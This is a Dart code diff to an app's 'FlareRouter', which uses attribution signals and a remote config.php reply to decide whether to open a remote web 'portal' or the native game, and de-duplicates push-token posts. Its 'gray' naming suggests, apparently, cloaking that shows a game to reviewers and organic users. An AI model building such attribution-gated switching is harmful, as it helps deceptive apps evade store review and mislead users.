@@ -33,6 +33,18 @@ class FlareRouter {
 
   bool get enabled => runtimeEnabled && FlareConfig.grayCredentialsReady;
 
+  /// Token refresh must not POST config until conversion is in. An early
+  /// identity-only body is what locked testers on "No data" / native game
+  /// while the developer's already-attributed phone kept opening gray.
+  bool _exchangeReady = false;
+
+  /// Firebase re-issues the same push token 2-4× per cold start (APNs
+  /// handshake, MessagingHub cache refresh, provisional prompt). Each
+  /// `onTokenRefresh` was POSTing an identical body to `config.php`,
+  /// so a single install produced 5+ `[NPD.XCHG] response` lines and
+  /// wasted the partner's rate budget. Guard against replays.
+  String? _lastPostedToken;
+
   Future<FlareLanding>? _decideFuture;
 
   Future<FlareLanding> decide({
@@ -65,13 +77,12 @@ class FlareRouter {
       return const VoidLanding(returnToGame: false);
     }
 
-    pulse.onTokenChanged = _refreshForToken;
-
     // Firebase getInitialMessage MUST resolve before we look for a
     // cold-start URL — with FirebaseAppDelegateProxyEnabled=true Firebase
     // eats the notification response and SceneDelegate may never see it,
     // so OrbitTapReader alone returns null on the terminated-tap path.
     // boot() writes any initial-message URL into the vault we drain below.
+    // Do NOT attach onTokenChanged yet — that POST raced ahead of AF.
     await _warmPulse();
     onProgress(0.22);
 
@@ -119,11 +130,16 @@ class FlareRouter {
     await _pullCampaignTap();
     await attribution.awaitSignals();
     await _pullCampaignTap();
+    if (attribution.campaignFallbackUrl == null) {
+      flareTrace(() => '[NPD.FLARE] no OneLink tap on this launch');
+    }
+    _armExchange();
     progress(0.74);
     final reply = await _requestConfig();
     progress(1);
     flareTrace(
-      () => '[NPD.FLARE] first: hasDest=${reply.hasDestination} url=${reply.url}',
+      () => '[NPD.FLARE] first: hasDest=${reply.hasDestination} url=${reply.url} '
+          'verdict=${attribution.hasConversionVerdict}',
     );
     if (reply.hasDestination) {
       await vault.saveLane(OrbitLane.portal);
@@ -134,6 +150,18 @@ class FlareRouter {
       flareTrace(() => '[NPD.FLARE] first: config empty → campaign fallback');
       await vault.saveLane(OrbitLane.portal);
       return PortalLanding(fallback);
+    }
+    // Bolt: a 404 before conversion must NOT lock the install on game.
+    // Next cold start retries with cached GCD.
+    if (!attribution.hasConversionVerdict) {
+      flareTrace(() => '[NPD.FLARE] first: no AF verdict yet → stay open');
+      return const GameLanding();
+    }
+    // First-launch Organic is often a late OneLink match. Do not lock
+    // testers on game — the next cold start re-asks GCD.
+    if (attribution.isOrganic && attribution.isFirstLaunch) {
+      flareTrace(() => '[NPD.FLARE] first: organic first launch → stay open');
+      return const GameLanding();
     }
     await vault.saveLane(OrbitLane.game);
     return const GameLanding();
@@ -171,6 +199,7 @@ class FlareRouter {
       ),
     );
     await _pullCampaignTap();
+    _armExchange();
     final reply = await _requestConfig();
     progress(1);
     if (reply.hasDestination) return PortalLanding(reply.url!);
@@ -193,6 +222,7 @@ class FlareRouter {
     await _pullCampaignTap();
     await attribution.awaitSignals();
     await _pullCampaignTap();
+    _armExchange();
     final reply = await _requestConfig();
     progress(1);
     if (reply.hasDestination) {
@@ -265,8 +295,14 @@ class FlareRouter {
         _warmPulse(),
       ]);
       await attribution.awaitSignals();
+      _armExchange();
       await _requestConfig();
     } catch (_) {}
+  }
+
+  void _armExchange() {
+    _exchangeReady = true;
+    pulse.onTokenChanged = _refreshForToken;
   }
 
   Future<FlareReply> pullConfig({String? token}) => _requestConfig(token: token);
@@ -285,6 +321,10 @@ class FlareRouter {
   Future<void> refreshForToken(String token) => _refreshForToken(token);
 
   Future<void> _refreshForToken(String token) async {
+    if (!_exchangeReady) return;
+    if (token.isEmpty) return;
+    if (token == _lastPostedToken) return;
+    _lastPostedToken = token;
     try {
       await _requestConfig(token: token);
     } catch (_) {}
